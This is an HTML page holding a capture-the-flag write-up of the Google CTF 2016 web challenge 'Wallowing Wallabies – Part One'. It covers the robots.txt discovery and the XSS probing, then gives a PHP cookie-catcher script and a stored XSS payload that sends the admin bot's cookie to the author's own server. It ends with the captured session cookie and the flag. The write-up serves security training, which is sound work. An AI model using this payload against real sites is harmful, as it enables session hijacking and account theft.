@@ -1,0 +1,122 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallowing Wallabies – Part One (Web) | Google CTF 2016 - Writeup</title>
+    <link rel="stylesheet" href="../assets/css/styles.css">
+</head>
+<body>
+    <header>
+        <h2>./YW5vdGhlcmlr</h2>
+        <p>Wallowing Wallabies – Part One (Web) | Google CTF 2016 - Writeup</p>
+    </header>
+    <nav>
+        <a href="../index.html">Home</a>
+        <a href="../index.html#ctf-writeups">Back to CTF Write-ups</a>
+    </nav>
+    <main>
+        <h2>Wallowing Wallabies – Part One (Web) | Google CTF 2016 - Writeup</h2>
+        <span class="date-post">Posted on April 29, 2016</span>
+        <h3>Problem</h3>
+                    <p>Wallowing Wallabies provides enterprise contract management - we'd like to find out how easy it is to perform corporate espionage against them.</p>
+                    <h3>Solution</h3>
+                    <p>This is the pretty cool design we get when we load the exercise web page. For some reason I thought it could help me solve the exercise if I read the announcement, but no luck here. But I guess they are really secure, so much Enterprise! So much blue screen! ;)
+<br>And for the record, this page has no links or anything to interact with.</p>
+
+                    <img src="imgs/ctf2_1.png" alt="image1" class="centered-image"></img>
+
+                    <p>
+                    After a quick look in the source code, which give us nothing we thought of trying the /robots.txt, and yup, we found something:</p>
+
+                    <pre>
+                    <code>
+User-agent: *
+Disallow: /deep-blue-sea/
+Disallow: /deep-blue-sea/team/
+# Yes, these are alphabet puns :)
+Disallow: /deep-blue-sea/team/characters
+Disallow: /deep-blue-sea/team/paragraphs
+Disallow: /deep-blue-sea/team/lines
+Disallow: /deep-blue-sea/team/runes
+Disallow: /deep-blue-sea/team/vendors
+                    </code></pre>
+
+                    <p>So, we found the deep-blue-sea! :D And started crawling these sub-pages, all denied until the last one:
+"/deep-blue-sea/team/vendors" where we found:</p>
+
+                    <img src="imgs/ctf2_2.png" alt="image2" class="centered-image"></img>
+
+                    <p>
+                    This page shows us a form that asks for our name and a text field to justify why we wanted access to their system. We started by sending a normal request to see the workflow of the page. As soon as we submitted the form, it showed us the details we entered. Ok, so far so good. Let's play a little.
+<br>First, once we have an automatic response showing us what we typed it should be some kind of bot replying, and also at the end of the submission it said "an admin will review your application as soon as possible", so maybe we can get something from this bot.
+<br>Let's check for vulnerabilities in the form, by simply adding:
+                    </p>
+                    <pre>
+                    <code>
+Name
+anotherik 
+Justification
+&lt;script&gt;alert("Test!")&lt;/script&gt;</code></pre>
+
+                    <p>
+                    We got the alert pop-up when the web page was giving us the reply, which proved to us that an XSS vulnerability was present on their page. 
+<br>The next step was to think of a way to gain some kind of access using this vulnerability. So far we knew that the website used a bot to give us the reply and it didn't have a prevention to XSS in the text field. 
+<br>For the sake of just trying we gave it a try to a simple:
+<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
+<br>And of course with no luck, 'cause the cookie was not set here.
+<br>I set up a server with a simple php cookie catcher script:
+                    </p>
+
+                    <pre>
+                    <code class="php">
+&lt;?php
+$cookie = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date = date("j F, Y, g:i a");
+$fp = fopen('cookies.html', 'a');
+fwrite($fp, 'Cookie: '.$cookie.'&lt;br&gt; IP: ' .$ip. '&lt;br&gt; Date and Time: ' .$date. '&lt;br&gt; &lt;br&gt; &lt;br&gt;');
+fclose($fp);
+?&gt;</code></pre>
+
+                    <p>or you can go simpler:</p>
+
+                    <pre>
+                    <code class="php">
+&lt;?php
+if(isset($_GET["c"])){
+  $cookie = $_GET["c"];
+  file_put_contents("cookies.txt", $cookie);
+}
+?&gt;</code></pre>
+
+                    <p>
+                    And the payload to the textfield form was:<br>
+<code><b>&lt;script&gt;document.location="http://mydomain/cookie_catcher.php?c="+document.cookie&lt;/script&gt;</b></code>
+<br>
+Back in my server, I got the log inside the cookies.html which gave us the cookie:
+    
+                    </p>
+
+                    <pre>
+                    <code>
+cookie=green-mountains=eyJub25jZSI6IjU4MzYwMzIyZmFhYjVmZGQiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9
+ycy4qJCIsImV4cGlyeSI6MTQ2MTk3NjMwNX0=|1461976302|774b68429266fe1b836e57294299dab27d5481e6</code></pre>
+
+                    <p>So, now we have a cookie and when you have a cookie the best thing you have to do (other than eat it :P ) is use it, so we set up the cookie and it gave us the first flag:</p>
+
+                    <br>
+                    <img src="imgs/ctf2_3.png" alt="image3" class="centered-image"></img>
+
+                </div>
+            </div>
+        </div>
+    </article>
+
+    </main>
+    <footer>
+        &copy; Ricardo Gonçalves&nbsp;&bull;&nbsp;2024
+    </footer>
+</body>
+</html>
